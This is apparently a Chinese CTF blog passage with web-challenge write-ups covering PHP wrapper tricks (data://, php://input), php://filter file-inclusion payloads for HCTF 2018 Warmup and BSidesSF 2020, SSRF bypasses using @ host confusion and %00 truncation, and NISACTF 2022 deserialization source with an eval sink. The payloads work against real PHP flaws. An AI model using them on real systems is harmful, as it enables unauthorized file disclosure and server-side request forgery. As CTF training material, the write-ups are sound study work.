applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">恭喜你<br>turn <span class="hljs-keyword">to</span><br><br>/orzorz.php<br></code></pre></td></tr></table></figure><p>构造 payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url<span class="hljs-regexp">/orzorz.php?cxk=data:/</span><span class="hljs-regexp">/text/</span>plain,ctrl<br></code></pre></td></tr></table></figure><p>得到flag</p><p>其他解法<br> 伪协议：<br> php:&#x2F;&#x2F;input<br> payload：<br> get：?cxk&#x3D;php:&#x2F;&#x2F;input<br> post: ctrl<br> data协议有两种：<br> get：?cxk&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,ctrl<br> get：?cxk&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,Y3RybA&#x3D;&#x3D; （base64encode（ctrl）&#x3D;Y3RybA&#x3D;&#x3D;</p><h1 id="HCTF-2018-Warmup"><a href="#HCTF-2018-Warmup" class="headerlink" title="[HCTF 2018]Warmup"></a>[HCTF 2018]Warmup</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];  <span class="hljs-comment">//白名单 只能访问这几个页面</span><br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123; <span class="hljs-comment">//检测是不是字符串</span><br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );   <span class="hljs-comment">//这意味着，如果 $page 是一个包含查询字符串的 URL，例如 source.php?id=123，mb_substr 将提取出 source.php，去掉 ?id=123 这一部分。</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>ffffllllaaaagggg<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>主要部分  ：</p><p>if (! empty($_REQUEST[‘file’])<br>        &amp;&amp; is_string($_REQUEST[‘file’])<br>        &amp;&amp; emmm::checkFile($_REQUEST[‘file’])<br>    ) {<br>        include $_REQUEST[‘file’];<br>        exit;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">以REQUEST方式接收file传递过来的值，由is_string、emmm::checkFile处理之后交给include去处理<br>is_string 百度可以得到是判断file是不是字符串的意思<br>emmm::checkFile 是第二部分代码，也是该题目最核心的部分<br></code></pre></td></tr></table></figure><h1 id="BSidesSF-2020-Had-a-bad-day-php伪协议可以嵌套使用"><a href="#BSidesSF-2020-Had-a-bad-day-php伪协议可以嵌套使用" class="headerlink" title="[BSidesSF 2020]Had a bad day php伪协议可以嵌套使用"></a>[BSidesSF 2020]Had a bad day php伪协议可以嵌套使用</h1><p>猜测可能有<a href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">sql注入</a>或者文件包含<br> 尝试了sql注入有报错<br><img src="/2024/10/25/susu/39e1eb8fa89218072ea3603969f54bbb.png" alt="39e1eb8fa89218072ea3603969f54bbb"><br> 确定是文件包含了，并且还在后面连接了一个.php</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=index<br></code></pre></td></tr></table></figure><p>base 64解码后得到源码</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;Images that spark joy&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Had a bad day?<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/material.min.css&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/style.css&quot;</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mdl-layout__header-row&quot;</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mdl-layout-title&quot;</span>&gt;</span>Had a bad day?<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mdl-layout-spacer&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page-ribbon&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page-main mdl-layout__content&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page-container mdl-grid&quot;</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page-crumbs mdl-color-text--grey-500&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Cheer up!<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!</span><br><span class="language-xml">              <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page-include&quot;</span>&gt;</span></span><br><span class="language-xml">              </span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;category&#x27;</span>];</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))</span><br><span class="language-php">&#123;</span><br><span class="language-php"><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;</span><br><span class="language-php"><span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="language-php">&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;choice&quot;</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;category&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;woofers&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot;</span> <span class="hljs-attr">data-upgraded</span>=<span class="hljs-string">&quot;,MaterialButton,MaterialRipple&quot;</span>&gt;</span>Woofers<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mdl-button__ripple-container&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mdl-ripple is-animating&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;category&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;meowers&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot;</span> <span class="hljs-attr">data-upgraded</span>=<span class="hljs-string">&quot;,MaterialButton,MaterialRipple&quot;</span>&gt;</span>Meowers<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mdl-button__ripple-container&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mdl-ripple is-animating&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/material.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>解释</span><br></code></pre></td></tr></table></figure><p>这个必须加上woofers”或”meowers”才能进行文件包含，然后自动加后缀.php。</p><p>利用 php伪协议可以嵌套使用<br> 在filter伪协议中，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs u">php://filter/read=convert.base64-encode/meowers/resource=flag<br></code></pre></td></tr></table></figure><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><img src="/2024/10/25/susu/8ac5c9adb8860669e62584594a0d786.png" alt="8ac5c9adb8860669e62584594a0d786"></p><h3 id="常见的绕过方式总结"><a href="#常见的绕过方式总结" class="headerlink" title="常见的绕过方式总结"></a>常见的绕过方式总结</h3><h4 id="1、限制为http-www-xxx-com域名时（利用-）"><a href="#1、限制为http-www-xxx-com域名时（利用-）" class="headerlink" title="1、限制为http://www.xxx.com域名时（利用@）"></a>1、限制为<a href="http://www.xxx.com%E5%9F%9F%E5%90%8D%E6%97%B6%EF%BC%88%E5%88%A9%E7%94%A8@)/">http://www.xxx.com域名时（利用@）</a></h4><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">可以尝试采用http基本身份认证的方式绕过<br>如：http://www.aaa.com<span class="hljs-meta">@www.bbb.com</span><span class="hljs-meta">@www.ccc.com，在对</span><span class="hljs-meta">@解析域名中，不同的处理函数存在处理差异</span><br>在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。<br></code></pre></td></tr></table></figure><hr><h1 id="GKCTF-2020-cve版签到-SSRF"><a href="#GKCTF-2020-cve版签到-SSRF" class="headerlink" title="[GKCTF 2020]cve版签到 SSRF"></a>[GKCTF 2020]cve版签到 SSRF</h1><p>点连接，一眼SSRF，F12，在响应头中发现提示，flag在127.0.0.1</p><p><img src="/2024/10/25/susu/d0f049b91e701de919578132adfc3fa.png" alt="d0f049b91e701de919578132adfc3fa"></p><p>但是要求结尾必须是.ctfhub.com，用到%00截断</p><p><strong>原理：</strong>截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的白名单限制。</p><p>又发现提示，以123结尾。</p><p><img src="/2024/10/25/susu/226d79d9eeffa9a999d1ed2607f73f1.png" alt="226d79d9eeffa9a999d1ed2607f73f1"></p><p>得到flag</p><p><img src="/2024/10/25/susu/531b519d901193321d748cb8a67701a.png" alt="531b519d901193321d748cb8a67701a"></p><h1 id="NISACTF-2022-babyserialize"><a href="#NISACTF-2022-babyserialize" class="headerlink" title="[NISACTF 2022]babyserialize"></a>[NISACTF 2022]babyserialize</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;waf.php&quot;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NISA</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>=<span class="hljs-string">&quot;show_me_flag&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$txw4ever</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;fun==<span class="hljs-string">&quot;show_me_flag&quot;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">hint</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$from</span>,<span class="hljs-variable">$val</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;fun=<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;fun;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">checkcheck</span>(<span class="hljs-variable">$this</span>-&gt;txw4ever);<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;txw4ever);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TianXiWei</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ext-&gt;<span class="hljs-title function_ invoke__">nisa</span>(<span class="hljs-variable">$this</span>-&gt;x);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ilovetxw</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$huang</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$su</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun1</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;huang-&gt;fun=<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;su;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$bb</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">four</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span 